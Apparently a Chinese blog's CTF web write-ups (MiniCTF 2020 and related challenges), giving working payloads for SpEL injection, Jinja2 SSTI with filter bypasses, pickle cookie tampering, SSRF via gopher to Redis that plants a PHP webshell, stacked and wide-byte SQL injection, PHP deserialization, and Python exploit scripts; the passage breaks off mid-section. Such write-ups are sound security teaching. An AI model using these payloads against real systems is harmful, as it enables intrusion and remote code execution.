<span class="title">MainController</span> </span>&#123;</span><br><span class="line">    ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">main</span><span class="params">(HttpServletRequest request,<span class="meta">@RequestParam(required = false)</span> String code,<span class="meta">@RequestParam(required = false)</span> String url)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        String requestURI = request.getRequestURI();</span><br><span class="line">        <span class="keyword">if</span>(requestURI.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (code!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                String s = parser.parseExpression(code).getValue().toString();</span><br><span class="line">                <span class="keyword">return</span> s;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;so?&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==<strong>代码审计</strong>== 比较关键的一些知识点如下：</p><ul><li>@RequestMapping(‘/‘)</li><li>getRequestURI()</li><li>equals(“/“)</li><li>parser.parseExpression(code).getValue().toString()</li></ul><p>==<strong>解题思路</strong>== 由于代码很少，基础知识了解了，解题的思路也就出来了 首先，题目的描述中给了提示：<code>flag在/flag中</code>，利用给出的提示，拿到flag的方式无非有两种，通过命令执行，如<code>cat /flag</code>，或者直接通过文件读取，读取到<code>/flag</code>的内容<code>payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(&#39;/flag&#39;), T(java.nio.charset.Charset).defaultCharset())</code></p><p><code>flag:miniL&#123;edd0faa3-c21b-40da-ac82-53bf734299c9&#125;</code></p><h2 id="L-inc"><a href="#L-inc" class="headerlink" title="L inc."></a>L inc.</h2><p>经过一些尝试，得到题目的第一步应该是认证vip身份 抓包，看到cookie应该是base64:<code>gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==</code> 用python解一下：<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.&#39;</code> 结合PHP序列化的字符串，这个看起来也像是一个序列化字符串 实际上这就是python的序列化字符串，<code>cys</code>前是它的长度 用python的pickletools处理一下（注意到\x89是NEWFALSE 尝试一下\x90,\x88）可知<code>\x88</code>是NEWTRUE 将更改后的字符串base64encode，作为cookie 成功认证vip身份。 </p><p><img src="https://camo.githubusercontent.com/a54a8521d3be41470b88af434c3f865eec632998acba26f4124f44eaa551cdc7/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f31303636376238663337653937303462393232323333613835636238646465392e706e67"></p><p><img src="https://camo.githubusercontent.com/cea03f13f57dfd7fa0ef7f0085a808e184a6cd38fcc82cb62b7415ac75e92562/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35326133373537366536373938323535326565383666306534366433663234662e706e67"></p><p>并且可以看到前面的输入回显到了页面上，猜测是SSTI 输入<code>&#123;&#123;3*3&#125;&#125;</code>成功回显9 这里我做题时没来及的写脚本，所以是直接输入payload，抓包，改包认证vip身份来做题的 paylaod: <strong>查目录</strong> <code>gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==</code> <strong>查flag</strong> <code>gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu</code></p><p><img src="https://camo.githubusercontent.com/0819fd5ce56fd3c39735f814e73c9febc65cf87120f4337880cb7b92021bd606/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f64366433626363643132363539666163316338616132336261636137626136332e706e67"></p><p><img src="https://camo.githubusercontent.com/a094728e835a53600c499230e9d79adc9aeabc0b9c3ac5e328dbe2897dfdd44d/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f66363762343263616462393535623532373838356237636533396138333765352e706e67"></p><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><p>看题目名字大概可以确定这是一道模板注入的题目 经过简单的测试，可能是通过JS过滤了<code>&#39;&#123;&#39;&#39;&#125;&#39;&#39;%&#39;</code>,想到调试一下题目JS代码，看看能否去掉过滤(这里稍稍与lt师傅出题时候的想法不一样，相当于走了个小捷径)， 进入到JS的源码部分，直接搜索<code>&#123;</code>找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下submit函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用alert()结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。 没有JS的过滤了，那么就可以进行模板注入了,首先常规的<code>&#123;&#123;3*3&#125;&#125;</code>得到回显9，应该是jinja2的模板注入 经过简单的测试，过滤了<code>&#39;class&#39;,&#39;base&#39;,&#39;subclasses&#39;,&#39;init&#39;,&#39;flag&#39;,&#39;os&#39;,&#39;.&#39;,&#39;+&#39;,&#39;|&#39;,单引号</code> 这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的<code>&quot;&quot;.__class__.__base__.__subclasses__()</code>链条去执行命令，jinja2有个特性，<code>&quot;&quot;[&quot;__class__&quot;]==&quot;&quot;.__class__</code>，基于此，可以通过”进行字符拼接，利用这个特性绕过.以及关键词的过滤 一开始想着用这个链条<code> x[&quot;__init__&quot;][&quot;__globals__&quot;][&quot;__getitem__&quot;](&quot;__builtins__&quot;)</code>去调用命令执行模块,后来发现想的太简单了,可能由于python版本等诸多原因,这个payload在服务器端是打不通的 之后想通过遍历找到可以执行命令的模块,写了这个payload:<code>&#123;% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %&#125; &#123;% if c["__na""me__"] == "catch_warnings" %&#125; &#123;&#123;c["__in"it__"]["__getitem__"]["__globals__"]["__builtins__"]["eval"]("__import__(\"o\"\"s\")[\"system\"](\"ls /\")") &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code>但是可能由于相同的原因,这个payload也打不通 最后没办法只好通过手撕去查找,题目能利用的模块,我是用这个链条完全的手撕…(主要是最开始做题目虽然走了捷径,但也把思路禁锢在了直接在输入框中进行注入,没有想到抓包,写脚本跑一下)<code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[0]&#125;&#125;</code>最后得到</p><p><img src="https://camo.githubusercontent.com/3a16259342452d62bf8551c04b7536bcbd8c01fc69517409baadf05f7188836a/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f39346633343238386433386461633339303031363733663532643539623634622e706e67"></p><p>找到了可以执行命令的模块就什么都好说了 最终payload: <code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("ls /")["read"]()&#125;&#125;</code></p><p><img src="https://camo.githubusercontent.com/95edf11f5500aebdce1ca7858d39bddb58fb23887fd238f0bfdceb1d0c1c7bc5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61363062373436393330376134643330356331616535396537393735346665362e706e67"></p><p><code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /f*")["read"]()&#125;&#125;</code></p><h2 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h2><p>题目打开，是一个提示可以输入URL的框，猜测考察SSRF 进行简单的手动测试，得到过滤了<code>file://</code>,<code>dict</code>,<code>localhost</code>,<code>../</code> <code>file://</code>被过滤了，可以尝试<code>file:/</code>去绕过 POST传参，<code>url=file:/var/www/html/index.php</code> 得到了页面的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, <span class="variable">$url</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;这样子可不行哦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;minisecret&#x27;</span>]))&#123;</span><br><span class="line">system(<span class="string">&#x27;ifconfig eth1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST，minisecret会执行<code>ifconfig eth1</code>，让我们查看到相应的网卡信息</p><p> <a href="https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67"><img src="https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67" alt="img"></a></p><p>由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是172.192.97.3 <a href="https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67"><img src="https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67" alt="img"></a> </p><p>由于gopher协议是没有被过滤的，可以首先测试一下3306(mysql)以及6379(redis)是否开启服务，得到redis是有服务的 那么解决办法就是利用gopher协议去打redis，最终得到flag 起初想写入Webshell，然后用工具去连接，但这是不行的，已知的ip应该是一个内网ip，无法通过蚁剑等从外部连接 所以就想能否直接在shell中通过执行命令把flag查出来并回显 运行生成payload的工具<code>gopherus</code>,写入<code>&lt;?php system(&#39;cat /f*&#39;); ?&gt;</code>(这里基于前几题的flag位置进行了一点猜测) </p><p>payload：<code>url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code> </p><p>再利用SSRF访问172.192.97.3/shell.php，成功得到回显</p><p> <a href="https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67"><img src="https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67" alt="img"></a></p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MiniCTF_2020</title>
      <link href="/bufferfly/blog/1732563798.html"/>
      <url>/bufferfly/blog/1732563798.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf.xidian.edu.cn/challenges">平台</a>上只有web的题目，只写了web。比赛的时候应该还有其他的。</p><p><a href="https://github.com/XDSEC/moeCTF_2020/tree/main/Misc">西电的信息安全协会里有题目</a>，<del>什么时候复现一下</del></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h3><p>好像根据BUUCTF的那个随便注改的吧？之前我也写过那个题的wp. 但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名miniL，没跑出来表名,这个就是用二分法不断的尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150#</span><br></pre></td></tr></table></figure><p>后来想起来应该是堆叠注入，得到了俩表user和1145141919810，查看下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `user`;</span><br><span class="line">id=1&#x27;) or (ascii(substr(database(),1,1)))&lt;150;show columns from `1145141919810`;</span><br></pre></td></tr></table></figure><p>然后查看列在1145141919810中看到了content（flag也应该在这里） 在mysql中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。<br>在sql中我们运用如下语句预编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=CONCAT(&#x27;sele&#x27;,&#x27;ct content from `1145141919810`&#x27;);</span><br><span class="line">prepare payload from @sql;</span><br><span class="line">execute payload;</span><br><span class="line">deallocate prepare payload;</span><br></pre></td></tr></table></figure><p>做到最后一个hint：strstr（）是提示我们大小写的，多试着改几次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT(&#x27;sele&#x27;,&#x27;ct content From `1145141919810`&#x27;); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#</span><br></pre></td></tr></table></figure><p>然后就可以拿到flag了（发现怎么还有个假的？？？emmmm）</p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>发现将cookie两部处理后传入file，将cookie里的gitbase64decode一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>改成<code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;classes.php&quot;;&#125;</code></p><p>最后的__wakeup魔术方法可以用php反序列化的CVE-2016-7124绕过。看github，是要传参cmd执行，但是过滤了一大堆东西，发现preg_match里唯独保留了P，此题题目也是P，想到看过的一篇文章，利用执行上传的临时文件tmp/phpXXXXXX，原文地址<a href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:3:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span><span class="comment">#反引号不输出，用&lt;?=代替&lt;?php echo输出</span></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;#!/bin/sh\ncat /* | grep minil&#x27;</span>&#125;</span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br></pre></td></tr></table></figure><h3 id="签-到-题"><a href="#签-到-题" class="headerlink" title="签 到 题"></a>签 到 题</h3><p>ls /看到了flag 和readflag，然后看了可用的bash，有sh和ash，不知道ash有什么用，</p><p>/readflag返回<code>do you want the flag?</code> ，后来🐧说frk喜欢考察linux，或许是交互回复一个yes?找了一下可以交互的函数，找到了<strong>proc_open</strong>，查了下函数的用法，一开始用Yes没用，试了下y有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下exp，核心是<code>y\ny\n120\n</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url += <span class="string">&#x27;?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;minil&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)<span class="comment">#不用延时的话一直都是docker准备状态 ):</span></span><br></pre></td></tr></table></figure><p>// Frank注: 你们为什么都这么喜欢暴力啊啊啊啊啊 怪我心软了给你们模了100</p><h3 id="are-you-reclu3e-Author-blackwatch"><a href="#are-you-reclu3e-Author-blackwatch" class="headerlink" title="are you reclu3e?| Author: blackwatch"></a>are you reclu3e?| Author: blackwatch</h3><p>扫出来了 .index.php.swp .login.php.swp</p><p>vim -r 还原</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;connection.php&quot;</span>;</span><br><span class="line">    mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SET CHARACTER SET &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span>=addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span>=addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&#x27;please post your username&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span>=<span class="string">&#x27;you are not reclu3e&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]!==<span class="variable">$password</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span>=<span class="string">&#x27;I know you are reclu3e but you need post the right password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Yes! you are reclu3e&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$msg</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">$msg</span>&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;close();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;window.location.href=&#x27;index.php&#x27;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/script&gt;&quot;</span>;  </span><br><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;<span class="comment">//$flag=&quot;minilctf&#123;****&#125;&quot;;</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;loginForm.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, reclu3e!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$p</span>=unserialize(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$height</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$serialize</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric(<span class="keyword">$this</span>-&gt;serialize))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;serialize++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&#x27;$s=&quot;&#x27;</span>.<span class="keyword">$this</span>-&gt;serialize.<span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login逻辑是判断输入的密码和取出的usr对应的密码比较，插表，GBK+addslashes 宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=reclu3e%df%27%20union%20select%201,2%23&amp;password=2</span><br></pre></td></tr></table></figure><p>php反序列化漏洞，private变量名前后要用%00</p><p><code>@eval(&#39;$s=&quot;&#39;.$this-&gt;serialize.&#39;&quot;;&#39;);</code>用”;闭合前后</p><figure class="highlight 